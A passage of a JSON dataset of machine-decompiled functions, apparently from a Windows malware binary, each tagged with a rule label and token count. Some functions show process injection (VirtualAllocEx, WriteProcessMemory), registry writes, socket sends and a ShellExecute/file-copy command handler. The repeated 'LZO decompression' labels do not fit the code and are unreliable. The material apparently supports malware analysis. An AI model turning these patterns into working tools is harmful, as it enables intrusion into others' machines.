        "decompiled_code": "\nvoid fcn.00470e48(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_15ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack384 = 0x470e79;\n    fcn.00405fe8();\n    uStack388 = 0x470faf;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    puStack396 = 0x470e92;\n    puStack384 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack396 = 0x470e9a;\n    fcn.00470dac();\n    puStack396 = 0x470ea7;\n    fcn.00405818();\n    puStack396 = 0x470eaf;\n    cVar1 = fcn.0040a298();\n    if (cVar1 != '\\0') {\n        puStack396 = 0x470ec2;\n        fcn.0040e838();\n        puStack396 = 0x470ecd;\n        fcn.004055c8();\n        puStack396 = 0x470ee0;\n        fcn.00405864();\n        puStack396 = 0x470ef6;\n        iVar2 = fcn.0040a490();\n        if (iVar2 == 0) {\n            uStack400 = 0x470f4b;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                uStack404 = 0x470fec;\n                fcn.004058e0();\n                iVar2 = fcn.0040a4e0();\n            } while (iVar2 == 0);\n            *in_FS_OFFSET = uStack404;\n            fcn.0040a504(0x470f52);\n            return;\n        }\n        puStack396 = 0x470f6a;\n        fcn.00405a84();\n        puStack396 = 0x470f78;\n        fcn.00405584();\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x470fb6;\n    uStack388 = 0x470f90;\n    fcn.00405530();\n    uStack388 = 0x470fa1;\n    fcn.004060ac();\n    uStack388 = 0x470fae;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 655
    },
    "00471304": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471304(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x47131c;\n    fcn.004059cc();\n    puStack28 = 0x471324;\n    fcn.004059cc();\n    puStack28 = 0x47132c;\n    fcn.004059cc();\n    uStack32 = 0x4713ad;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.004059dc(&fcn.00471304::hKey);\n    sub.advapi32.dll_RegCreateKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004059dc(arg_8h);\n    uVar1 = fcn.004059dc(0, 2, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x4713b4);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 334
    },
    "00471ae4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00471ae4(uint param_1)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.0040aac4(param_1);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x104);\n    fcn.00405728();\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (*(*in_EAX + -1 + iVar2) != '\\\\') {\n        fcn.00405818();\n    }\n    fcn.0040ab10();\n    return;\n}\n",
        "token_count": 155
    },
    "00473610": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00473703)\n\nvoid __fastcall fcn.00473610(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack48 = 0x47362d;\n    fcn.004059cc();\n    uStack52 = 0x473787;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x47374d;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x473655;\n    puStack48 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    uStack76 = 0x47373c;\n    puStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    (**(*piVar1 + 0x2c))();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))();\n            puStack80 = &fcn.00473610::var_8h;\n            iVar3 = fcn.00405b28();\n            uVar4 = iVar3 == 1;\n            fcn.00405a44();\n            fcn.00409b84();\n            fcn.00409b84(0);\n            fcn.00405974();\n            if (uVar4) {\n                fcn.00405b28();\n                fcn.00405a84();\n                puStack80 = param_2;\n                fcn.00405a44();\n                break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = puStack80;\n    puStack72 = 0x473743;\n    uStack76 = 0x47373b;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 623
    },
    "004737a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.004737a4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint *var_2ch;\n    uint32_t var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = 6;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_18h = 0x4737c4;\n    var_ch = param_2;\n    fcn.004059cc();\n    var_1ch = 0x47393e;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004737a4::var_20h;\n    var_24h = 0x4737da;\n    var_18h = &stack0xfffffffc;\n    fcn.00405530();\n    var_24h = 0x4737e2;\n    cVar1 = fcn.0040a274();\n    if (cVar1 != '\\0') {\n        var_24h = 0x4737f5;\n        fcn.0048b300();\n        if (var_8h != 0) {\n            var_8h = *(var_8h + -4);\n        }\n        if (0 < var_8h) {\n            var_24h = 0x473815;\n            var_10h = fcn.00404620();\n            var_28h = 0x47390f;\n            var_2ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.004737a4::var_2ch;\n            var_24h = &stack0xfffffffc;\n            (**(*var_10h + 0x2c))();\n            iVar2 = (**(*var_10h + 0x14))();\n            if (-1 < iVar2 + -1) {\n                do {\n                    (**(*var_10h + 0xc))();\n                    cVar1 = fcn.0048a278();\n                    if (cVar1 != '\\0') {\n                        (**(*var_10h + 0x20))();\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            (**(*var_10h + 0x1c))();\n            fcn.00409b84();\n            (**(*var_10h + 0x2c))();\n            *in_FS_OFFSET = var_2ch;\n            var_24h = 0x473916;\n            var_28h = *0x473958;\n            var_2ch = &fcn.004737a4::var_20h;\n            (**(*var_10h + 0x1c))();\n            fcn.0040ef4c(var_2ch, var_28h);\n            (**(*var_10h + 0x2c))();\n            (**(*var_10h + 0x1c))();\n            fcn.0048c77c(var_28h);\n            fcn.00405864();\n            fcn.0046163c();\n            fcn.00404650();\n            return;\n        }\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x473945;\n    var_1ch = 0x473930;\n    fcn.00405554();\n    var_1ch = 0x47393d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 939
    },
    "004739a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004739a0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x473a4f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x473a56);\n    return;\n}\n",
        "token_count": 324
    },
    "00474364": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00474364(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 4) {\n        if (in_EAX == 3) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 2) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 6) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 7) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "004744e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004744e0(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 3) {\n        if (in_EAX == 2) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 0) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x100) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x101) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00474660": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00474660(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack104;\n    uint uStack100;\n    uint *arg_8h;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack88 = 0x474a32;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    cVar1 = fcn.00474230();\n    if (cVar1 != '\\0') {\n        uStack100 = 0x4749fb;\n        iStack104 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff98;\n        fcn.00405530();\n        fcn.00405530();\n        fcn.00405530();\n        iVar2 = (***0x495bb8)(1, 0, &fcn.00474660::var_1ch, &fcn.00474660::var_18h);\n        if (iVar2 == 0) {\n            uStack100 = 0;\n            iStack104 = var_18h;\n            iVar2 = (***0x495980)();\n            if (iVar2 == 0) {\n                var_2ch = *var_20h;\n                if (-1 < var_2ch + -1) {\n                    var_24h = 0;\n                    do {\n                        uStack100 = 0x47473f;\n                        fcn.004057b8();\n                        uStack100 = 0;\n                        iStack104 = 0x474a48;\n                        fcn.004058e0();\n                        fcn.004097a8(var_10h);\n                        fcn.004058e0(0x474a54, 0);\n                        iVar2 = (***0x495b84)(var_18h, var_20h + var_20h[1] * 0x85 + 2, 1, 0, &fcn.00474660::var_28h);\n                        if (iVar2 != 0) {\n                            fcn.00404f70();\n                            goto code_r0x00474a02;\n                        }\n                        iVar2 = *var_28h;\n                        if (-1 < iVar2 + -1) {\n                            do {\n                                arg_8h = &fcn.00474660::var_8h;\n                                uStack100 = 0x4747da;\n                                fcn.0040642c();\n                                uStack100 = 0x4747f3;\n                                fcn.0040afa0(arg_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    uStack100 = 0x474810;\n                                    fcn.004055c8();\n                                }\n                                uStack100 = var_ch;\n                                iStack104 = var_8h;\n                                fcn.004058e0(0x474a48);\n                                fcn.00405728();\n                                fcn.0040afa0(&fcn.00474660::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x474a48, var_8h, var_ch);\n                                fcn.0040afa0(&fcn.00474660::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x474a48, 0x474a84, var_8h, var_ch);\n                                fcn.00474364();\n                                fcn.0040afa0(&fcn.00474660::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                fcn.004058e0(0x474a48, var_8h, var_ch);\n                                fcn.004744e0();\n                                fcn.0040afa0(&fcn.00474660::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                iStack92 = 0x474a54;\n                                fcn.004058e0();\n                                iVar2 = iVar2 + -1;\n                            } while (iVar2 != 0);\n                        }\n                        var_24h = var_24h + 1;\n                        var_2ch = var_2ch + -1;\n                    } while (var_2ch != 0);\n                }\n                uStack100 = 0x474a90;\n                iStack104 = 0x474a54;\n                fcn.004058e0(var_10h);\n                (***0x495cf4)(var_18h, 0);\n                *in_FS_OFFSET = var_18h;\n                fcn.0047434c(0x474a02);\n                return;\n            }\n            fcn.00404f70();\n        }\n        else {\n            fcn.00404f70();\n        }\n    }\ncode_r0x00474a02:\n    *in_FS_OFFSET = iStack92;\n    puStack84 = 0x474a39;\n    uStack88 = 0x474a17;\n    fcn.00405530();\n    uStack88 = 0x474a24;\n    fcn.00405554();\n    uStack88 = 0x474a31;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1556
    },
    "00474a94": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t fcn.00474a94(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint8_t *in_EAX;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    uint16_t uVar9;\n    uint *in_FS_OFFSET;\n    uchar auStack48 [12];\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack48;\n    puVar6 = in_EAX;\n    if (in_EAX != NULL) {\n        bVar4 = false;\n        bVar3 = false;\n        var_8h = 4;\n        var_14h = 0;\n        do {\n            puVar5 = puVar6;\n            uVar1 = *puVar5;\n            uVar9 = uVar1;\n            puVar6 = puVar5 + 1;\n            if (uVar1 == 0x66) {\n                var_8h = 2;\n            }\n            else if (uVar1 == 0x67) {\n                bVar4 = true;\n            }\n            else if (((uVar1 & 0xe7) != 0x26) && (1 < uVar1 - 100)) {\n                bVar3 = true;\n            }\n        } while (!bVar3);\n        if (uVar1 == 0xf) {\n            uVar7 = *(*puVar6 * 2 + 0x495430);\n            uVar9 = *puVar6 + 0xf00;\n            puVar6 = puVar5 + 2;\n        }\n        else {\n            uVar7 = *(uVar1 * 2 + 0x495230);\n        }\n        if ((uVar7 & 0x38) != 0) {\n            uVar1 = *puVar6;\n            uVar8 = uVar1 & 7;\n            puVar6 = puVar6 + 1;\n            if ((uVar1 & 0xc0) == 0x40) {\n                var_10h = 1;\n            }\n            else if ((uVar1 & 0xc0) == 0x80) {\n                if (bVar4) {\n                    var_10h = 2;\n                }\n                else {\n                    var_10h = 4;\n                }\n            }\n            else {\n                var_10h = 0;\n            }\n            if (!((uVar1 & 0xc0) != 0xc0 & bVar4)) {\n                if ((uVar8 == 4) && ((uVar1 & 0xc0) != 0xc0)) {\n                    uVar8 = *puVar6 & 7;\n                }\n                if (((uVar1 & 0xc0) == 0) && (uVar8 == 5)) {\n                    var_10h = 4;\n                }\n                puVar6 = puVar6 + var_10h;\n            }\n            if ((uVar7 & 0x38) == 8) {\n    // switch table (32 cases) at 0x474c0f\n                switch(uVar9) {\n                case 0xd8:\n                    var_14h = 2;\n                    break;\n                case 0xd9:\n                    var_14h = 3;\n                    break;\n                case 0xda:\n                    var_14h = 4;\n                    break;\n                case 0xdb:\n                    var_14h = 5;\n                    break;\n                case 0xdc:\n                    var_14h = 6;\n                    break;\n                case 0xdd:\n                    var_14h = 7;\n                    break;\n                case 0xde:\n                    var_14h = 8;\n                    break;\n                case 0xdf:\n                    var_14h = 9;\n                    break;\n                case 0xf6:\n                    var_14h = 0;\n                    break;\n                case 0xf7:\n                    var_14h = 1;\n                }\n                if ((uVar1 & 0xc0) == 0xc0) {\n                    uVar7 = *(var_14h * 0x20 + 0x495640 + (uVar1 >> 3 & 7) * 2);\n                }\n                else {\n                    uVar7 = *(var_14h * 0x20 + 0x495630 + (uVar1 >> 3 & 7) * 2);\n                }\n            }\n        }\n        uVar7 = uVar7 & 0xc00;\n        if (uVar7 == 0x400) {\n            puVar6 = puVar6 + 1;\n        }\n        else if (uVar7 == 0x800) {\n            puVar6 = puVar6 + 2;\n        }\n        else if (uVar7 == 0xc00) {\n            puVar6 = puVar6 + var_8h;\n        }\n        else {\n            if (uVar9 != 0x9a) {\n                if (uVar9 - 0xa0 < 4) {\n                    if (bVar4) {\n                        puVar6 = puVar6 + 2;\n                    }\n                    else {\n                        puVar6 = puVar6 + 4;\n                    }\n                    goto code_r0x00474d38;\n                }\n                if (uVar9 == 200) {\n                    puVar6 = puVar6 + 3;\n                    goto code_r0x00474d38;\n                }\n                if (uVar9 != 0xea) goto code_r0x00474d38;\n            }\n            puVar6 = puVar6 + var_8h + 2;\n        }\n    }\ncode_r0x00474d38:\n    *in_FS_OFFSET = uVar2;\n    return puVar6 - in_EAX;\n}\n",
        "token_count": 1346
    },
    "00474d80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00474daf)\n// WARNING: Removing unreachable block (ram,0x00474dd8)\n\nvoid fcn.00474d80(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint *puVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint lpNumberOfBytesWritten;\n    \n    puStack32 = &stack0xfffffffc;\n    lpNumberOfBytesWritten = 0;\n    uStack36 = 0x474e06;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405728();\n    sub.kernel32.dll_VirtualAllocEx();\n    fcn.00405728();\n    puVar2 = &lpNumberOfBytesWritten;\n    uVar1 = 1;\n    sub.kernel32.dll_WriteProcessMemory();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405554(0x474e0d, uVar1, puVar2);\n    return;\n}\n",
        "token_count": 252
    },
    "00475d98": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00475d98(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x475db0;\n    fcn.004059cc();\n    uStack28 = 0x475e29;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00461360();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    uVar1 = fcn.00405a3c(in_EAX, 0);\n    uVar2 = **0x495af4;\n    sub.wsock32.dll_send(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x475e30);\n    return;\n}\n",
        "token_count": 266
    },
    "00475e38": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00475e38(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x475e52;\n    fcn.004059cc();\n    uStack28 = 0x475ec4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00461360();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405554(0x475ecb);\n    return;\n}\n",
        "token_count": 241
    },
    "00475ed4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00475ed4(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x475ee7;\n    fcn.004059cc();\n    uStack24 = 0x475f36;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405530(0x475f3d);\n    return;\n}\n",
        "token_count": 218
    },
    "0047f10c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0047f10c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    ulong uVar4;\n    uint in_stack_ffffffc0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x47f3ce;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047f10c::var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    uVar4 = fcn.0048a98c();\n    iVar2 = uVar4 >> 0x20;\n    uVar3 = iVar2 == *(in_EAX + 0x54);\n    if (uVar3) {\n        uVar3 = uVar4 == *(in_EAX + 0x50);\n        if (uVar4 < *(in_EAX + 0x50)) goto code_r0x0047f3a6;\n    }\n    else if (iVar2 < *(in_EAX + 0x54)) goto code_r0x0047f3a6;\n    fcn.00405974();\n    if (uVar3) {\n        uVar1 = fcn.004059dc(0, 0, 5);\n        in_stack_ffffffc0 = 0x47f175;\n        sub.shell32.dll_ShellExecuteA(0, 0x47f3f0, uVar1);\n    }\n    else {\n        fcn.00405a44(&fcn.0047f10c::var_8h);\n        fcn.00405974();\n        if (uVar3) {\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f3f0, uVar1);\n            }\n            else {\n                uVar1 = fcn.004059dc(0, 0, 5);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f3f0, uVar1);\n            }\n        }\n        else {\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f3f0, uVar1);\n                fcn.00475980();\n            }\n            else {\n                fcn.00405974();\n                if (uVar3) {\n                    uVar1 = fcn.004059dc(0, 0, 1);\n                    in_stack_ffffffc0 = 0;\n                    sub.shell32.dll_ShellExecuteA(0, 0x47f3f0, uVar1);\n                }\n                else {\n                    fcn.00405974();\n                    if (uVar3) {\n                        fcn.0048a4b8(0x80);\n                        fcn.00405818();\n                        uVar1 = fcn.004059dc();\n                        sub.kernel32.dll_SetFileAttributesA(uVar1);\n                        fcn.0048a4b8();\n                        fcn.00405818();\n                        var_14h = var_10h;\n                        uVar1 = fcn.004059dc();\n                        sub.kernel32.dll_DeleteFileA(uVar1);\n                        fcn.0048a4b8(0);\n                        fcn.00405818();\n                        uVar1 = fcn.004059dc();\n                        in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                        sub.kernel32.dll_CopyFileA();\n                    }\n                    else {\n                        fcn.00405974();\n                        if (uVar3) {\n                            uVar1 = fcn.004059dc(0, 1);\n                            sub.winmm.dll_PlaySoundA(uVar1);\n                        }\n                        else {\n                            fcn.00405974();\n                            if (uVar3) {\n                                var_14h = **0x495880;\n                                iVar2 = var_14h;\n                                if (var_14h != 0) {\n                                    iVar2 = *(var_14h + -4);\n                                }\n                                if (0 < iVar2) {\n                                    fcn.0040a5a8(0);\n                                    fcn.00473610(var_20h);\n                                    fcn.004058e0(0x47f49c, &fcn.0047f10c::var_8h);\n                                    uVar1 = fcn.004059dc();\n                                    in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                                    sub.kernel32.dll_CopyFileA();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0047f3a6:\n    *in_FS_OFFSET = in_stack_ffffffc0;\n    fcn.00405554(0x47f3d5);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1354
    },
    "00480a28": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
